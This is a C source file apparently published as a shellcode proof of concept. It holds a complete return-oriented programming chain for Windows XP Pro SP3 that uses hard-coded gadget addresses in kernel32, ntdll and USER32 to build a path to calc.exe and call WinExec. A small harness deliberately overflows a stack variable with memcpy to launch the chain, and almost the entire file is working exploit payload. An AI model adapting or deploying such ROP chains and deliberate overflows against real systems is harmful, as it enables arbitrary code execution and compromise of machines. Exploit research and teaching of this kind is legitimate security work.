/*
    Shellcode: Windows XP PRO SP3 - Full ROP calc shellcode
    Author: b33f (http://www.fuzzysecurity.com/)
    Notes: This is probably not the most efficient way but
           I gave the dll's a run for their money ;))
    Greets: Donato, Jahmel

    OS-DLL's used:
       Base    |    Top     |   Size     |    Version (Important!)
    ___________|____________|____________|_____________________________
    0x7c800000 | 0x7c8f6000 | 0x000f6000 | 5.1.2600.5781 [kernel32.dll]
    0x7c900000 | 0x7c9b2000 | 0x000b2000 | 5.1.2600.6055 [ntdll.dll]
    0x7e410000 | 0x7e4a1000 | 0x00091000 | 5.1.2600.5512 [USER32.dll]

    UINT WINAPI WinExec(            => PTR to WinExec
      __in  LPCSTR lpCmdLine,       => C:\WINDOWS\system32\calc.exe+00000000
      __in  UINT uCmdShow           => 0x1
    );
*/

#include <iostream>
#include "windows.h"

char shellcode[]=
"\xb1\x4f\x97\x7c"  // POP ECX # RETN
"\xf9\x10\x47\x7e"  // Writable PTR USER32.dll
"\x27\xfa\x87\x7c"  // POP EDX # POP EAX # RETN
"\x43\x3a\x5c\x57"  // ASCII "C:\W"
"\x49\x4e\x44\x4f"  // ASCII "INDO"
"\x04\x18\x80\x7c"  // MOV DWORD PTR DS:[ECX],EDX # MOV DWORD PTR DS:[ECX+4],EAX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x57\x53\x5c\x73"  // ASCII "WS\s"
"\x38\xd6\x46\x7e"  // MOV DWORD PTR DS:[ECX+8],EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x79\x73\x74\x65"  // ASCII "yste"
"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x63\x61\x6c\x63"  // ASCII "calc"
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x6d\x33\x32\x5c"  // ASCII "m32\"
"\xcb\xbe\x45\x7e"  // MOV DWORD PTR DS:[ECX+C],EAX # XOR EAX,EAX # INC EAX # POP ESI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x2e\x65\x78\x65"  // ASCII ".exe"
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\x9e\x2e\x92\x7c"  // XOR EAX,EAX # RETN
"\x31\xa9\x91\x7c"  // MOV DWORD PTR DS:[ECX+14],EAX # MOV EAX,EDX # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
"\xee\x4c\x97\x7c"  // DEC ECX # RETN
//-------------------------------------------["C:\WINDOWS\system32\calc.exe+00000000" -> ecx]-//
"\xe5\x02\x88\x7c"  // POP EAX # RETN
"\x7a\xeb\xc3\x6f"  // Should result in a valid PTR in kernel32.dll
"\x4f\xda\x85\x7c"  // PUSH ESP # ADC BYTE PTR DS:[EAX+CC4837C],AL # XOR EAX,EAX # INC EAX # POP EDI # POP EBP # RETN 08
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x32\xd9\x44\x7e"  // XCHG EAX,EDI # RETN
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
"\x62\x28\x97\x7c"  // ADD EAX,20 # POP EBP # RETN
"\x8a\x20\x87\x7c"  // Compensate POP
//-----------------------------------------------------------[Save Stack Pointer + pivot eax]-//
"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\x33\x80\x97\x7c"  // INC EAX # RETN
"\xf5\xd6\x91\x7c"  // XOR ECX,ECX # RETN
"\x07\x3d\x96\x7c"  // INC ECX # RETN
"\xd6\xd1\x95\x7c"  // MOV DWORD PTR DS:[EAX+10],ECX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\xb1\x4f\x97\x7c"  // POP ECX # RETN
"\xed\x2a\x86\x7c"  // WinExec()
"\xe7\xc1\x87\x7c"  // MOV DWORD PTR DS:[EAX+4],ECX # XOR EAX,EAX # POP EBP # RETN 04
"\x8a\x20\x87\x7c"  // Compensate POP
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Compensate RETN
"\x8a\x20\x87\x7c"  // Final RETN for WinExec()
"\x8a\x20\x87\x7c"; // Compensate WinExec()
//------------------------------------------------------[Write Arguments and execute -> calc]-//

void buff() {
	char a;
	memcpy((&a)+5, shellcode, sizeof(shellcode)); // Compiler dependent, works with Dev-C++ 4.9
}

int main()
{
    LoadLibrary("USER32.dll"); // we need this dll
	char buf[1024];
	buff();
	return 0;
}